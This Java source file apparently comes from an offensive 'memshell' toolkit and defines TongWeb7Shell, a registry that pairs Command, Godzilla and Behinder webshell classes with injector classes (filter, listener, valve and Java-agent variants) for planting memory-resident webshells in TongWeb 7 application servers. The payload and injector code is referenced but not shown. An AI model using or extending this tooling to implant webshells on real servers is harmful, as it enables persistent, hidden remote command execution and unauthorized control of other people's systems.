package com.reajason.javaweb.memshell;

import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilterChainAdvisor;
import com.reajason.javaweb.memshell.tomcat.behinder.BehinderListener;
import com.reajason.javaweb.memshell.tomcat.command.CommandListener;
import com.reajason.javaweb.memshell.tomcat.godzilla.GodzillaListener;
import com.reajason.javaweb.memshell.tongweb.behinder.BehinderValve7;
import com.reajason.javaweb.memshell.tongweb.command.CommandValve7;
import com.reajason.javaweb.memshell.tongweb.godzilla.GodzillaValve7;
import com.reajason.javaweb.memshell.tongweb.injector.*;
import org.apache.commons.lang3.tuple.Pair;

import java.util.LinkedHashMap;
import java.util.Map;

import static com.reajason.javaweb.memshell.config.Constants.*;

/**
 * @author ReaJason
 * @since 2024/12/26
 */
public class TongWeb7Shell extends AbstractShell {

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getCommandShellMap() {
        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
        map.put(FILTER, Pair.of(CommandFilter.class, TongWebFilterInjector.class));
        map.put(JAKARTA_FILTER, Pair.of(CommandFilter.class, TongWebFilterInjector.class));
        map.put(LISTENER, Pair.of(CommandListener.class, TongWebListenerInjector.class));
        map.put(JAKARTA_LISTENER, Pair.of(CommandListener.class, TongWebListenerInjector.class));
        map.put(VALVE, Pair.of(CommandValve7.class, TongWebValveInjector.class));
        map.put(JAKARTA_VALVE, Pair.of(CommandValve7.class, TongWebValveInjector.class));
        map.put(AGENT_FILTER_CHAIN, Pair.of(CommandFilterChainAdvisor.class, TongWebFilterChainAgentInjector.class));
        map.put(AGENT_CONTEXT_VALVE, Pair.of(CommandFilterChainAdvisor.class, TongWebContextValveAgentInjector.class));
        return map;
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getGodzillaShellMap() {
        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
        map.put(FILTER, Pair.of(GodzillaFilter.class, TongWebFilterInjector.class));
        map.put(JAKARTA_FILTER, Pair.of(GodzillaFilter.class, TongWebFilterInjector.class));
        map.put(LISTENER, Pair.of(GodzillaListener.class, TongWebListenerInjector.class));
        map.put(JAKARTA_LISTENER, Pair.of(GodzillaListener.class, TongWebListenerInjector.class));
        map.put(VALVE, Pair.of(GodzillaValve7.class, TongWebValveInjector.class));
        map.put(JAKARTA_VALVE, Pair.of(GodzillaValve7.class, TongWebValveInjector.class));
        map.put(AGENT_FILTER_CHAIN, Pair.of(GodzillaFilterChainAdvisor.class, TongWebFilterChainAgentInjector.class));
        map.put(AGENT_CONTEXT_VALVE, Pair.of(GodzillaFilterChainAdvisor.class, TongWebContextValveAgentInjector.class));
        return map;
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getBehinderShellMap() {
        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
        map.put(FILTER, Pair.of(BehinderFilter.class, TongWebFilterInjector.class));
        map.put(JAKARTA_FILTER, Pair.of(BehinderFilter.class, TongWebFilterInjector.class));
        map.put(LISTENER, Pair.of(BehinderListener.class, TongWebListenerInjector.class));
        map.put(JAKARTA_LISTENER, Pair.of(BehinderListener.class, TongWebListenerInjector.class));
        map.put(VALVE, Pair.of(BehinderValve7.class, TongWebValveInjector.class));
        map.put(JAKARTA_VALVE, Pair.of(BehinderValve7.class, TongWebValveInjector.class));
        map.put(AGENT_FILTER_CHAIN, Pair.of(BehinderFilterChainAdvisor.class, TongWebFilterChainAgentInjector.class));
        map.put(AGENT_CONTEXT_VALVE, Pair.of(BehinderFilterChainAdvisor.class, TongWebContextValveAgentInjector.class));
        return map;
    }
}
